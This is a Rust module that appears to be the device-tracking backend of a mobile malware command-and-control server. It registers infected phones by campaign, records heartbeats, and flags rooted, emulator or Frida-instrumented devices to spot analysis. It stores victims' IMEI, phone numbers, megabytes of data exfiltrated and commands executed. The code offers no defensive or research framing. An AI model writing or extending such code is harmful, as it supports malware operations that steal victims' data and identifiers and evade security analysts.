use anyhow::Result;
use chrono::Utc;
use sqlx::SqlitePool;
use tracing::info;

pub struct DeviceRegistry {
    db: SqlitePool,
}

impl DeviceRegistry {
    pub fn new(db: SqlitePool) -> Self {
        Self { db }
    }

    /// Register a new device
    pub async fn register_device(
        &self,
        device_id: &str,
        fingerprint: &str,
        campaign_id: &str,
        env_key_hash: &str,
        os_version: i32,
        manufacturer: &str,
        model: &str,
    ) -> Result<()> {
        let now = Utc::now();

        sqlx::query(
            r#"
            INSERT INTO devices (
                device_id, fingerprint, campaign_id, env_key_hash,
                first_seen, last_seen, last_heartbeat, is_active,
                os_version, manufacturer, model, created_at, updated_at
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            "#,
        )
        .bind(device_id)
        .bind(fingerprint)
        .bind(campaign_id)
        .bind(env_key_hash)
        .bind(&now)
        .bind(&now)
        .bind(&now)
        .bind(true)
        .bind(os_version)
        .bind(manufacturer)
        .bind(model)
        .bind(&now)
        .bind(&now)
        .execute(&self.db)
        .await?;

        info!("Device registered: device_id={}, fingerprint={}", device_id, fingerprint);
        Ok(())
    }

    /// Get device by ID
    pub async fn get_device(&self, device_id: &str) -> Result<Option<DeviceRecord>> {
        let record = sqlx::query_as::<_, DeviceRecord>(
            "SELECT * FROM devices WHERE device_id = ?"
        )
        .bind(device_id)
        .fetch_optional(&self.db)
        .await?;

        Ok(record)
    }

    /// Check if fingerprint already exists
    pub async fn fingerprint_exists(&self, fingerprint: &str) -> Result<bool> {
        let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM devices WHERE fingerprint = ?")
            .bind(fingerprint)
            .fetch_one(&self.db)
            .await?;

        Ok(count > 0)
    }

    /// Update last seen timestamp
    pub async fn update_last_seen(&self, device_id: &str) -> Result<()> {
        let now = Utc::now();

        sqlx::query("UPDATE devices SET last_seen = ?, last_heartbeat = ? WHERE device_id = ?")
            .bind(&now)
            .bind(&now)
            .bind(device_id)
            .execute(&self.db)
            .await?;

        Ok(())
    }

    /// Get all active devices for a campaign
    pub async fn get_campaign_devices(&self, campaign_id: &str) -> Result<Vec<DeviceRecord>> {
        let devices = sqlx::query_as::<_, DeviceRecord>(
            "SELECT * FROM devices WHERE campaign_id = ? AND is_active = TRUE ORDER BY last_seen DESC"
        )
        .bind(campaign_id)
        .fetch_all(&self.db)
        .await?;

        Ok(devices)
    }

    /// Get devices that haven't checked in for N hours
    pub async fn get_stale_devices(&self, hours_since_activity: i64) -> Result<Vec<DeviceRecord>> {
        let devices = sqlx::query_as::<_, DeviceRecord>(
            "SELECT * FROM devices WHERE is_active = TRUE AND datetime(last_seen) < datetime('now', '-' || ? || ' hours')"
        )
        .bind(hours_since_activity)
        .fetch_all(&self.db)
        .await?;

        Ok(devices)
    }

    /// Mark device as inactive
    pub async fn mark_inactive(&self, device_id: &str) -> Result<()> {
        sqlx::query("UPDATE devices SET is_active = FALSE WHERE device_id = ?")
            .bind(device_id)
            .execute(&self.db)
            .await?;

        Ok(())
    }

    /// Update device flags
    pub async fn update_device_flags(
        &self,
        device_id: &str,
        rooted: Option<bool>,
        frida_detected: Option<bool>,
        emulator: Option<bool>,
    ) -> Result<()> {
        let mut updates = Vec::new();

        if let Some(r) = rooted {
            updates.push(format!("rooted = {}", r as i32));
        }
        if let Some(f) = frida_detected {
            updates.push(format!("frida_detected = {}", f as i32));
        }
        if let Some(e) = emulator {
            updates.push(format!("emulator = {}", e as i32));
        }

        if updates.is_empty() {
            return Ok(());
        }

        let query = format!(
            "UPDATE devices SET {} WHERE device_id = ?",
            updates.join(", ")
        );

        sqlx::query(&query)
            .bind(device_id)
            .execute(&self.db)
            .await?;

        Ok(())
    }

    /// Get device count by campaign
    pub async fn get_device_count_by_campaign(&self, campaign_id: &str) -> Result<i64> {
        let count: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM devices WHERE campaign_id = ? AND is_active = TRUE"
        )
        .bind(campaign_id)
        .fetch_one(&self.db)
        .await?;

        Ok(count)
    }
}

#[derive(Debug, Clone, sqlx::FromRow)]
pub struct DeviceRecord {
    pub device_id: String,
    pub fingerprint: String,
    pub campaign_id: String,
    pub env_key_hash: String,
    pub first_seen: String,
    pub last_seen: String,
    pub last_heartbeat: Option<String>,
    pub is_active: bool,
    pub os_version: Option<i32>,
    pub manufacturer: Option<String>,
    pub model: Option<String>,
    pub rooted: bool,
    pub frida_detected: bool,
    pub emulator: bool,
    pub country_code: Option<String>,
    pub operator: Option<String>,
    pub current_session_id: Option<String>,
    pub session_key_id: Option<String>,
    pub user_agent: Option<String>,
    pub imei: Option<String>,
    pub phone_number: Option<String>,
    pub data_exfilled_mb: f64,
    pub commands_executed: i32,
    pub created_at: String,
    pub updated_at: String,
}
